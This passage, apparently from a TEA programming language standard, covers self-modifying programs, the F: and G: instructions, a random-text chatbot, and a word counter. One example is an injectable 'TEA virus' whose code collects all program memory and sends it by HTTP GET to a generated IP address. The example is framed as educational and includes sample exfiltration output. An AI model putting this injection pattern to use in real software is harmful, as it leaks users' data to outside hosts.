   \end{lstlisting}
  \end{tcolorbox}
  \caption{A Basic TEA Hello World Program}
  \label{EXTEAHW}
\end{figure}


One might easily test/try out such a basic program via the WEB TEA IDE by invoking the following special URL in a web browser:

\vspace{1em}

 \url{https://tea.nuchwezi.com/?c=i!:{Hello+World}&run}

\vspace{1em}
That said, assuming we wrote a special version of that Hello World Program, that not only starts out the same exact way, and which allows no other explicit input except that initial string ``Hello World", but which, after it loads it, goes ahead to [use it to] generate a random program that then gets loaded into the main/caller program, and which then is executed [as an external program] against that initial input, and so that, whatever that external program returns, is a function of both the original input and what auto-generated code we ended up with. Essentially, we would expect a random program that somewhat makes the main program behave as a dynamic self-modifying program operating on the explicit input string ``Hello World" to return... \textit{whatever}!

\vspace{1em}

Such a program could be something like this...


 \begin{figure}[H]
 \Large
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: SELF-MODIFYING HELLO WORLD]
  \begin{lstlisting}[language=TEA]
i!:{Hello World} | v:vIN

e:{
 p!:3:abcdghikmnopqrstuvxy
 s:!|s:!
 h:[a-z]
 r!::_ | d:{ _} | d:^_ | r!:_!:! | r!:_:: | r:!{2,}:!
 h!:[a-z]
 k:[a-z]
}

v:vCMD #store the program we generated

y:vIN #load original input
e*:vCMD #execute it against generated program
v:vOUT #store the output

#then present the session results..
v:I:{Input was:} | v:C:{Auto-Generated Program Was:} 
| v:O:{Output Was:} | v:S:_
g*:_:I:vIN:S:C:vCMD:S:O:vOUT
r!:_:{
}
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: A SELF-MODIFYING HELLO WORLD TEA Program}
  \label{FIGD}
\end{figure}


Upon running that code, anywhere TEA can work, we shall get results such as the following...


  %\begin{tcolorbox}[title=Sample Text Containing Phone Contacts,  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
  \begin{tcbverbatim}[title=Sample Session of Self-Modifying TEA Hello World]
Input was:
Hello World


Auto-Generated Program Was:
k: :
v: :
p!:


Output Was:
hoymadebppfznmajnwmprwra ymtlhuxwkehmcmpdqnhaos trfmgkakypbv  
  \end{tcbverbatim}
  %\caption{The TEA Instruction Lexical Specification (regular language)}
  %\label{FIG1}



And another example... also an interactive one:




  \begin{tcbverbatim}[title=Sample Session of Self-Modifying TEA Hello World]
Input was:
Hello World


Auto-Generated Program Was:
t!: :
b!: :
i:


Output Was:
hi there 
  \end{tcbverbatim}
  %\caption{The TEA Instruction Lexical Specification (regular language)}
  %\label{FIG1}


This last one interestingly generated a program that prompted the user for some input at runtime, and so, the output of the main program is based on that input instead of the original explicit input!

\vspace{1em}

And then one final example output to show just how interesting this little self-modifying program might be...


  \begin{tcbverbatim}[title=Sample Session of Self-Modifying TEA Hello World]
Input was:
Hello World


Auto-Generated Program Was:
r!: :
g: :
t!:


Output Was:
Hello World
Hello Worl
Hello Wor
Hello Wo
Hello W
Hello 
Hello
Hell
Hel
He
H
  \end{tcbverbatim}
  %\caption{The TEA Instruction Lexical Specification (regular language)}
  %\label{FIG1}



\subsection{EXAMPLE 2: \textbf{INFORMATION SECURITY:} OFFENSIVE TEA-VIRUS PROGRAM MODIFYING and EXPOSING A CALLER PROGRAM via WEB}
\label{SECEXAMP2E}


First, let us try to build rapport for this next example, by first picturing what could go wrong when we have the power to write programs that can modifying themselves or which can modify other programs... We shall use some still-comics originally shared on the \textbf{UIC}\footnote{\textbf{UIC}: core Uganda Internet Community: \url{https://t.me/ugandanow}} which also happens to be the first Internet Community where both the Tech-inspired web-comic \#icecomics is typically posted, but also where much of the progress on the TEA language is shared with a close-knit circle of potential users and friends. In these pictures, we see the \#icecomic character, Ruby, chatting with her friend about a potentially malicious TEA program she came across...

\begin{figure}[H]
  \centering
  \begin{subfigure}[b]{0.45\textwidth}
    \includegraphics[width=\textwidth]{resources/images/self_mod1.jpg}
    %\caption{N-SIGIL v1.0.1: Intro Greeting Interface}
    %\label{FIGNSIGIL}
  \end{subfigure}
  \hfill
  \begin{subfigure}[b]{0.45\textwidth}
    \includegraphics[width=\textwidth]{resources/images/self_mod2.jpg}
    %\caption{N-SIGIL v1.0.1: a basic qrcode for the base-10 o-SSI}
    %\label{FIGNSIGIL2}
  \end{subfigure}
  \caption{\textbf{ICecomics} Ruby Complains about Self-Modifying TEA Program}
  \label{FIGSELFMODDEMO}
\end{figure}


 \begin{figure}[H]
  \centering
  \begin{subfigure}[b]{0.45\textwidth}
    \includegraphics[width=\textwidth]{resources/images/self_mod3.jpg}
    %\caption{N-SIGIL v1.0.1: Intro Greeting Interface}
    %\label{FIGNSIGIL}
  \end{subfigure}
  \hfill
  \begin{subfigure}[b]{0.45\textwidth}
    \includegraphics[width=\textwidth]{resources/images/hacker.jpg}
    %\caption{N-SIGIL v1.0.1: a basic qrcode for the base-10 o-SSI}
    %\label{FIGNSIGIL2}
  \end{subfigure}
  \caption{Hacking and Info-Sec Action Leveraging TEA Programming}
  \label{FIGSELFMODDEMO2}
\end{figure}



This example is shared here, for especially education/research purposes and is not meant to be actually used in real-life because... well, it could be dangerous!

\vspace{1em}

Essentially, we have crafted a special virus-like TEA program that can be injected into other TEA programs, and which injected program then, compromises the security of the caller/main program because it siphons off all the data the caller program had in memory, and then posts it to some address on the Internet. For purposes of demonstrating how convoluted such programs might be, we do not post to a specific IP address on the network, but instead let the program auto-generate its own destination address, and so, in a way, it also demonstrates how a hacker might craft a program that steals or shares secrets with destination computers that are otherwise hard to pin-down or which span a very large address-space so that determining to whom the data is being sent is actually hard.

\vspace{1em}

For purposes of helping students and other researchers understand this program, the original specification for the example is as such:


\begin{center}
\fbox{\begin{minipage}{0.9\textwidth}
\LARGE
\textbf{Specification of A Self-modifying TEA Virus Program:}\\

Compose an injectable TEA program that does the following:

\begin{enumerate}

\item Generates a random number and stores it in a vault named id

\item Generates a random alpha-message and stores it in a vault named data.

\item Generates a random IP address

\item Creates a TEA program that can make an HTTP GET request to that random IP address, sending everything in the vaults/memory to that random IP address as part of URL query data (including whatever is in the main program vaults)

\item It then prints whatever was returned from the remote server if not empty otherwise returns an error message indicating the randomly generated id, data and random IP address that couldn't respond as the sub-program output.

\item Make the above functionality all reside inside a single Stored Program in a vault named vCMD

\item Inject that program into the caller/main program using E*!:vCMD that shall also immediately execute it.

\item The main program shall become modified from that point on-wards, so that it executes the injected code, posts its memory details to the remote address and at the end of the injected program, has the AI holding the self-diagnosis message from the injected program or a message from the remote contacted server/Network end-point.

\item For education purposes, let the injected program merely print whatever is the AI after the injected program is executed and make the caller program quit unconditionally.
\end{enumerate}

\end{minipage}}
\\
\end{center}


Such a program could be something like this...


 \begin{figure}[H]
 \Large
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: TEA VIRUS Example]
  \begin{lstlisting}[language=TEA]
#store original input in main program
i:{Hello World} | v:vIN 

#the evil program stored in a string...
v:vCMD:"
n!:1000 | v:id #random id
p!:10 | v:data #random data
n!:256:0:4:. | v:ip #random ip address
v:vPROTOCOL:{http://}
x*:vPROTOCOL | v:url #target web endpoint
w*: #make HTTP GET with all vaults!
v:vOUT #store output/results
"

#now inject/execute that stored-virus-program 
#in main program
E*!:vCMD #modifies main program

#store any resulting output
v:vOUT

#in case we got any output post-self-modification, 
#print it and quit
#q:^$

#otherwise present the session results..
v:I:{Original Input was:}|v:C:{Injected Program Was:} 
| v:O:{Output Was:} | v:S:_
g*:_:I:vIN:S:C:vCMD:S:O:vOUT
r!:_:{
}
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: An Injectable TEA VIRUS Program Demonstrating SELF-MODIFYING Capabilities and Info-SEC Offensive Action}
  \label{FIGE1}
\end{figure}


Upon running that code, anywhere TEA can work, we shall get results such as the following...


  %\begin{tcolorbox}[title=Sample Text Containing Phone Contacts,  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
  \begin{tcbverbatim}[title=Sample Session of Injectable WEB-accessing TEA VIRUS]
Original Input was:
Hello World


Injected Program Was:

n!:1000 | v:id #random id
p!:10 | v:data #random data
n!:256:0:4:. | v:ip #random ip address
v:vPROTOCOL:{http://}
x*:vPROTOCOL | v:url #target web endpoint
w*: #make HTTP GET with all vaults!
v:vOUT #store output/results



Output Was:
[ERROR]: NetworkError: Failed to execute 'send' on 'XMLHttpRequest': Failed to load 'http://50.183.200.135/?vIN=Hello+World&vCMD=%0An%21%3A1000+%7C+v%3Aid+%23random+id%0Ap%21%3A10+%7C+v%3Adata+%23random+data%0An%21%3A256%3A0%3A4%3A.+%7C+v%3Aip+%23random+ip+address%0Av%3AvPROTOCOL%3A%7Bhttp%3A%2F%2F%7D%0Ax*%3AvPROTOCOL+%7C+v%3Aurl+%23target+web+endpoint%0Aw*%3A+%23make+HTTP+GET+with+all+vaults%21%0Av%3AvOUT+%23store+output%2Fresults%0A&id=642&data=vgisdhgmya&ip=50.183.200.135&vPROTOCOL=http%3A%2F%2F&url=http%3A%2F%2F50.183.200.135'. 
  \end{tcbverbatim}
  %\caption{The TEA Instruction Lexical Specification (regular language)}
  %\label{FIG1}


Note that the program is definitely attempting to make an HTTP GET request to a random address on the Internet. This might work or not --- for example, there is no guarantee that the target IP address actually exists nor that the server or network endpoint being contacted will accept the request, process it nor send back and useful message/result. However, the program does indeed make a network call, and data is actually posted off the calling system to some resource on the network. This alone could cause data-leaks or unknown side-effects over the network. However, despite that happens, the program has been written in such a way that we can at least easily DEBUG what actually was done --- we get to see what data the TEA-virus attempted to send to the remote server, we also see what IP address it was trying to contact, and then what result or error ensued from that call.

\vspace{1em}

For those interested in pursuing this line of research --- for example, students exploring domains like network-security, information-security, penetration-testing, hacking, virus-programming etc, it shall perhaps help offer some insights into what actual professional hackers might do when given the right kind of tools or languages.

\vspace{1em}

Also, for purposes of appreciating and testing this code out in real-life, one might load it into the WEB TEA IDE and try either modifying it further\footnote{Note that the TEA WEB IDE not only allows one to unminify a program, but also validate and/or sanitize it to ensure that it conforms to the right syntax and that it can readily be shared without extraneous comments, etc.} or build upon it to craft more serious payloads/programs. The minified version of the program can be loaded for testing via the call:


\vspace{1em}

 \url{https://tea.nuchwezi.com/?fc=https://gist.githubusercontent.com/mcnemesis/143ea8c1d49aee8e7758f5c414125382/raw/tea_virus_example_selfmod_min.tea}

\vspace{1em}



And for those interested, the minified+sanitized version of this program is as such:



 \begin{figure}[H]
 \Large
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: TEA VIRUS Example]
  \begin{lstlisting}[language=TEA]
i:{Hello World}
v:vIN
v:vCMD:"n!:1000|v:id|p!:10|v:data|n!:256:0:4:.|v:ip|
v:vPROTOCOL:{http://}|x*:vPROTOCOL|v:url|w*:|v:vOUT"
E*!:vCMD
v:vOUT
v:I:{Original Input was:}
v:C:{Injected Program Was:}
v:O:{Output Was:}
v:S:_
g*:_:I:vIN:S:C:vCMD:S:O:vOUT
r!:_:{
}
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: The Injectable TEA VIRUS Program Minified and Sanitized}
  \label{FIGE2}
\end{figure}




%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: F
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{F: FORK}
\label{CHAPF}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{FORK}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Conditionally Jump across a TEA program
	\item Implementing Branching Logic in a program
	\item How to Leverage Code Encapsulation or Closures Without Using \textbf{E:}
	\item Branching Logic Based on Pattern Matching --- applies \textbf{\hyperref[SECREGEXP]{TEA Regular Expressions}}
	\item Singular or Binary Branching Mechanism\footnote{Unlike \textbf{J:} which can only implement \textbf{singular jump instructions}.}
	\item A Logic-Only\footnote{Like \textbf{J:}, \textbf{L:} and \textbf{Q:}, \textbf{F:} is one of few TEA operators that performs logic-only operations and so that, any value of a program's \textbf{Active Input} before the instruction is encountered or executed in a TEA program, shall stay the same/unmodified after the instruction is executed/processed successfully or not --- this is guaranteed behavior of the language, \textbf{based on the semantics of the TEA Instruction Set and what this document, the TEA Standard, specifies.}} Instruction whose core purpose is \textbf{to enable logic about state of the active TEA program} --- via tests or pattern-matching against the AI.
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{F:}}
  \label{TABTAZF}
\end{table}


\section{SEMANTICS of F:}
\label{SECSEMF}

\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 

\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

f: & INERT\\

\rowcolor{lightgray}\bfseries \makecell[l]{f:REGEX:LA\\f:REGEX:LA:LB} & If the AI matches the regular expression REGEX then jump to the block in the TEA Program under the label LA, otherwise to LB. Only the first two parameters are mandatory. And LA, LB should be valid labels declared somewhere in the program.  \\

 f!: & INERT\\
 
\rowcolor{lightgray}\bfseries \makecell[l]{f!:REGEX:LA\\f!:REGEX:LA:LB} & Similar to f:, but the logic works same if AI does NOT match the regular expression REGEX\\

 f*: & INERT\\
 
 
 \rowcolor{lightgray}\bfseries \makecell[l]{f*:vREGEX:LA\\f*:vREGEX:LA:LB} & Like f:REGEX:LA and f:REGEX:LA:LB, but using the regex stored in the vault vREGEX  \\
 
  f*!: & INERT\\
  
   \rowcolor{lightgray}\bfseries \makecell[l]{f*!:vREGEX:LA\\f*!:vREGEX:LA:LB} & Like f!:REGEX:LA and f!:REGEX:LA:LB, but using the regex stored in the vault vREGEX  \\
 

 
 \hline
\end{tabular}
\caption{The Semantics of F:}
\label{TABSEMF}
\end{table}


\section{NOTES about F:}
\label{SECNOTESF}

\textbf{\hyperref[TABTAZF]{Table \ref{TABTAZF}}} has already clearly laid out the true fundamental applications of the \textbf{F:} operator in the mathematics of the TEA language. It allows us to implement logic or reasoning, in a computer program, via the mechanism of branching instruction execution in a TEA program [source], based on the current state of the program's AI.

\vspace{1em}

It is important to note that \textbf{f:} is the equivalent of an IF-Statement in most other languages such as C, Java or Ruby. We shall look at some illustrative examples to drive home ideas about why and how useful it is:



\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=F: EXAMPLE 1]
  \begin{lstlisting}[language=TEA]
i:TEST
f:TEST:A:B
l:B
x!:_OK
q!:
l:A
r:^T:B 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


Would return ``BEST" if AI at line\#2 is ``TEST", otherwise something like ``Hello\_OK" if the program was run with explicit user input ``Hello" or ``INPUT\_OK" for any AI = ``INPUT" at the moment that instruction is executed.

\vspace{1em}

Note that properly using conditional branching in TEA via the f: construct requires some careful thought. First, because TEA has no explicit code block construct such as using ``curly-bracket" code encapsulation such as \texttt{\{...code\}} in some c-family/c-like languages. Also, it is important to note that TEA \textbf{Label-Blocks} can overlap based on which Label occurs first. For example, try to re-write the above program with the B-block (lines \#3-5), which is our ``Else-Block" being preceded by the A-block (lines \#6-7), and see if it would produce the same test results as what we expect in the above example.

\vspace{1em}


Another simpler, but still enlightening example is the following short program:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=F: EXAMPLE 2]
  \begin{lstlisting}[language=TEA]
#shall return input shuffled if it matches ``TEST" 
i:TEST | f!:TEST:A:B | l:B |a!: | l:A | v: 
#(=TTSE, VAULTS:{"":"TTSE"})
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\section{EXAMPLE APPLICATIONS of F:}
\label{SECEXAMPF}

  
For those familiar with how the idea of intelligence might be approached in matters such as simulating or manifesting human-like cognition --- spanning perception/sensing, measurement/pattern-matching/decoding.. and reaction/actuation --- the \textbf{Willrich Psychology} model\cite{Lutalo2025transpsy} as depicted in \textbf{\hyperref[FIGWILLPSY]{Figure \ref{FIGWILLPSY}}} being a handy and useful resource for cases when we need worry about [creating] intelligence [in things], but also, creating reactive, observant and logical artificial systems especially --- \textbf{automatons}\footnote{\textbf{Automatons} being the kind whose logic/processing is directly dependent on reasoning based on observing the agent's [external] environment, while \textbf{Psymatons}\cite{lutalo2025unraveling} might also span systems whose reasoning might depend on observing the system's/agent's [internal] state/[internal] environment in addition to the external --- somewhat as though they have extra-sensory perception/can reason based on intuition or to an external observer/actor, they seem to possess a spirit or non-physical form of cognition --- we might as well think of say reasoning by entropy/chaos!}, that might need to work independently of human supervision or processing. This is especially true of the case of attempting to program \textbf{artificial intelligence} systems or even basic knowledge systems and any semblance of artificial reasoning in a computer program\footnote{For example, the \textbf{ZHA} --- Zee Hacker Assistant, first presented in \cite{jwlzha}, and which also leverages the TEA language, shall serve well to illustrate the importance of \textbf{F:}}.


\begin{figure}[H]
  \begin{center}
     %\includegraphics[trim=LEFT BOTTOM RIGHT TOP, clip, width=0.9\textwidth,]{resources/pdfs/EXAPLATONICFORM-PFA.pdf}\\
  %\includegraphics[trim=2cm 8cm 2cm 8cm, clip, width=0.9\textwidth,]{resources/pdfs/ProteinSynthesisStateMachine.pdf}\\
   \includegraphics[trim=0cm 12cm 0cm 0cm, clip, width=0.9\textwidth,]{resources/pdfs/all_willrich_psychology.pdf}\\
   \caption{Unifying Model of Willrich Psychology --- in a mind-map}
  \label{FIGWILLPSY}
  \end{center}
\end{figure}

  Thus, for a good demonstration of how conditional branching and pattern-based reasoning or logic might be realized and applied using \textbf{F:} and TEA programming, we shall use the example of the \textbf{ZHA} --- \textit{Zee Hacker Assistant}, a \textbf{quasi-Artificial General Intelligence} program that one might also readily find in the TEA standard programs list at \url{https://tea.nuchwezi.com}, and which was also extensively covered in theory and culturally, in \cite{jwlzha} and \cite{lutalo2025unraveling}.

\subsection{EXAMPLE 1: \textbf{COMPUTATIONAL PSYCHOLOGY:} ZHA --- ZEE HACKER ASSISTANT, a human support assistant chatbot system}
\label{SECEXAMP1F}  
  
 
 The most recent version of ZHA is as follows:
 

 %\begin{figure}[H]
 {
 \small
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: ZEE HACKER ASSISTANT v1.0.2, breakable]
  %\begin{lstlisting}[language=TEA, caption={TP C7}, label={LSTC7}, numbers=left]
  \begin{lstlisting}[language=TEA,breaklines=true]
#!/usr/bin/tttt -fc
#----------------------------------------------|
# ZHA: Zee Hacker Assistant (v.1.0.2) | SEPT,'25
#----------------------------------------------|
# based off of TEAPAT: TEA Personal AssistanT:
# ref: https://doi.org/10.20944/preprints202502.1849.v1
#----------------------------------------------|
# This little program is a mini
# quasi-general artificial intelligence (qAGI)
# a special personal assistant perhaps
# best left for hackers, created 
# using the TEA programming language: https://bit.ly/projtea
###############################################|

#show welcome message
v:vORIN
v:vWELCOME:"##############################-##### *:{~} ZHA v1.0.2 #######-##############################-welcome to the future of chat_-##############################--"
v:vREG:-|h*!:vWELCOME:vREG
d:-|i:

y:vORIN # continue...

# set entity name
v:vPANAME:{ZHA}
f:^$:lSET:lNOSET
l:lSET
i:{Who do u wish to talk to? }|i: # user's entity name
g:|f!:^$:lSETI:lRULES|l:lSETI|v:vPANAME|j:lRULES 
l:lNOSET | y*: | v:vPANAME # evoke invoker's entity
l:lRULES # show instructions
i!:{At any time, reply with 'end' to quit
}|i:
v:vPROMPT:{: Talk to Me: }
g*:{ }:vPANAME:vPROMPT | v:vPAPROMPT
l:lPROMPT # prompt, get answer, process

# generate question
n:10000000|s:|v:qN|
# decide between ANE and NE
n:|f!:[2357]:qANE:qNE
l:qANE|
# decide between AE and ANE
n:1|f:0:qAE
# generate ANE
p!:27
|s:_:13:5 |d:_.*$
|s: |v:qR
|g*:{}:qR:qN
|j:qF|
l:qAE # pure AE
p!:27
|s:_:13:5 |d:_.*$ |s:
|j:qF|
l:qNE # pure NE
|y:qN
|l:qF # process and package question 
|a:
|x:{: }
v:vQ

# decide on whether question or not
n:|f:[2357]:lNoQ
y:vQ
|x!:{?: }
j:lProQ

l:lNoQ
y:vQ
|x!:{ : }

l:lProQ
# stash generated question
v:vGenQuestion

# decide between default or generated prompt
n:|f:[2468]:lGenPROMPT:lDefPROMPT

l:lGenPROMPT
g*:{ }:vPANAME:vGenQuestion | v:vGenPROMPT
y:vGenPROMPT|j:lDisplayPROMPT

l:lDefPROMPT
y:vPAPROMPT

l:lDisplayPROMPT
| i: |z:| q:^end$
# generate answer
n:10000000|s:|v:N|
# decide between ANE and NE
n:|f!:[2357]:ANE:NE
l:ANE|
# decide between AE and ANE
n:1|f:0:AE
# generate ANE
p!:27
|s:_:13:5 |d:_.*$ |s: |v:R
|g*:{}:R:N
|j:F|
l:AE # pure AE
p!:27
|s:_:13:5 |d:_.*$ |s:
|j:F|
l:NE # pure NE
|y:N
|l:F # process and package answer 
|a:|v:vA

# decide on whether question or not
n:|f!:[2357]:lQA
y:vA
|x!:{? }
j:lNoQA

l:lQA
y:vA
|x!:{ | }

l:lNoQA
# display answer
|i: 
| j:lPROMPT # and loop
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: ZEE HACKER ASSISTANT v1.0.2}
  \label{FIGF}
  \vspace{1cm}


}
 %\centering  
 \raggedright %force normal/left-alignment  
  
 
 \textbf{\hyperref[FIGF]{Figure \ref{FIGF}}} covers what \textbf{ZHA v1.0.2} is, and an interested person could go read the code, modify or run it directly and live via:
  
  
\vspace{1em}

 \url{https://tea.nuchwezi.com/?i=.&fc=https://gist.githubusercontent.com/mcnemesis/97caf6d0573f7447a807cf635fd8128f/raw/ba38dc52a5256734054bdff7154dee5a90259e39/zha.tea}

\vspace{1em}

However, for an interesting illustration of what one might accomplish using this little offline-capable multi-turn conversational chatbot AI system, the following screenshot, despite being of v1.0.1 of the program, shall serve that purpose:


  \begin{figure}[H]
      \centering
      \includegraphics[width=0.8\textwidth,]{resources/images/zha3.png}\\
        \caption{ZHA v1.0.1: a queer conversation between a hacker and the person of The President that he invoked via ZHA!}
      \label{FIGZHA}
    \end{figure}
  

Also, note that, despite the above interactive link pointing to a version of ZHA that loads and runs well in any web-browser and on any operating system, and yet, the same code, just as is shown in  \textbf{\hyperref[FIGZHA]{Figure \ref{FIGZHA}}}, can be run on the command-line such as with Linux, WSL or Solaris. The TEA program shall run and work as expected anywhere there is TEA v1.0.1 or later.


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: G
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{G: GLUE}
\label{SECG}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{GLUE}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Bind things together
	\item Bind elements in AI using nothing --- eliminate white-space
	\item Perform pattern substitution in a text
	\item Eliminate new-line characters
	\item Eliminate all punctuation and white-space
	\item Construct strings using variables
	\item Reverse or opposite of \text{H:}
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{G:}}
  \label{TABTAZG}
\end{table}


\section{SEMANTICS of G:}
\label{SECSEMG}


\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 
\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

g: & Reduce AI to a string with all whitespace characters removed. Essentially binds any word in AI to all the rest. \\

\rowcolor{lightgray}\bfseries \makecell[l]{ g:GLUE\\g:GLUE:REGEX } & Set the IO to the result of reducing AI to a string where all instances of REGEX have already been replaced by GLUE. Without the second parameter – REGEX, g: merely replaces all whitespace in AI with GLUE.\\

g!: & INERT\\

\rowcolor{lightgray}\bfseries g.: & Reduce AI to a string with all NEW LINE characters removed. Essentially helps reverse h!:\\

 \makecell[l]{g.:GLUE} & Reduce AI to a string with all NEW LINE characters replaced by GLUE. Essentially helps reverse h!:REGEX\\
 
 \rowcolor{lightgray}\bfseries g!:GLUE & Reduce AI to a string where all standard sentence punctuation marks, in addition to all whitespace, have been replaced with GLUE.  GLUE is expected to be a string. The result of this transform then becomes IO.\\
 
  \makecell[l]{g*:GLUE:v1:v2\\g*:GLUE:v1:v2:v3:…:vN} & Set IO to the result of joining the string stored in the vaults with the given names, using the specified EXPLICIT GLUE\\
  
  
   \rowcolor{lightgray}\bfseries \makecell[l]{g*!:vGLUE:v1:v2\\g*!:vGLUE:v1:v2:v3:…:vN} & Set IO to the result of joining the string stored in the vaults with the given names, using the glue stored in vault vGLUE. With only vGLUE, operate on AI like g:GLUE\\
 
 \hline
\end{tabular}
\caption{The Semantics of G:}
\label{TABSEMG}
\end{table}


\section{NOTES about G:}
\label{SECNOTEG}

G: is the most magical primitive in TEA.  g: for example automagically sucks all space out of things and sets them aside for later use! Let’s look at an example:



\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=G: EXAMPLE 1]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB}| g:
#(=BCCBBAAB) 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

This next one sucks out all white-space as the above example, however, because it also has a parameter specified, uses it as GLUE to bind the elements together in-place of where white-space originally was.

\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=G: EXAMPLE 2]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB}| g:{_*_}
#(=BC_*_CB_*_BA_*_AB)
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


That's not without power. On the other hand, g!: can best be appreciated with examples processing regular human-readable text---which, is for example expected to have natural use of both whitespace and punctuation marks in it. Thus, the program


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=G: EXAMPLE 3]
  \begin{lstlisting}[language=TEA]
i!:{Which of this, 
that or both do you want?
None} | g!:{*}
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


Should return ``Which*of*this**that*or*both*do*you*want**None"


Otherwise, let's see more examples with their expected outputs shown in the comments:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=G: EXAMPLE 4]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB}| g:{_*_}:.[BC] #= _*__*_B_*_A _*_
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


That Example  4 shows how, \textbf{G:} might play roles that other instructions such a \textbf{R:} might typically be used for --- substitution in this case. Essentially, given the GLUE pattern and the SEARCH pattern, the signature \texttt{g:GLUE:SEARCH} as shown in that example replaces all instances of SEARCH in the AI with GLUE as shown in the example output.


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=G: EXAMPLE 5]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB}|v:vIN|v:vP:---[|v:vS:]--|v:vG:{_}|
g*!:vG:vP:vIN:vS  #=---[_BC CB BA AB_]--
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

That last example demonstrates how \textbf{GLUE} might be used to construct dynamic strings. This, especially via the vault-accessing \textbf{G*:} variants as shown in that example, but also as introduced in \textbf{\hyperref[TABSEMG]{Table \ref{TABSEMG}}}.



\section{EXAMPLE APPLICATIONS of G:}
\label{SECEXAMPG}

  
First, note that binding things together based on some criteria or none can serve several purposes as a pre-processing step in many important text-processing tasks. And as we shall see in the following non-trivial example, we need several pre-processing steps to correctly implement a program that can correctly do just one basic task --- count words in any given input text!


\subsection{EXAMPLE 1: \textbf{DATA ANALYSIS:} A SERIOUS WORD COUNTER PROGRAM}
\label{SECEXAMP1G}

The following example is of a TEA program that might be used to correctly count and report the number of words in any input text. 


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: SERIOUS WORD COUNTER]
  \begin{lstlisting}[language=TEA]
r!:\w+:{#} 
g.:{_} 
d:^[_]+ 
d:[_]+$ 
r!:[ ]:_ 
r!:[_]+:_ 
d!:{_} 
x!:_
v: 
v!:
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: WORD COUNTER}
  \label{FIGG1}
\end{figure}


So, that, when given a multi-line text such as:



  \begin{tcbverbatim}[title=Sample Input Text 1]
one two three
four
five six seven-eight
  \end{tcbverbatim}


Shall correctly report the result ``7". And yet, if given the slight alteration:





  \begin{tcbverbatim}[title=Sample Input Text 2]
one two three
four
five six seven?eight
  \end{tcbverbatim}



Shall still correctly return ``7". While for one-liners such as ``hello world ?" returns \textbf{3}, while it shall correctly return \textbf{2} for ``hello world?"

Concerning this non-trivial example, note that, to make it work well as standard word-counter programs might, the instruction  \textbf{G.:} played a big role than would any other TEA primitive (refer to \textbf{\hyperref[TABSEMG]{Table \ref{TABSEMG}}} for why). For example, all the above example input texts, including the following, report the correct word count with this TEA program as they do for the Microsoft Word text-processor program.



  \begin{tcbverbatim}[title=Sample Input Text 3]
hello 


world ?
  \end{tcbverbatim}



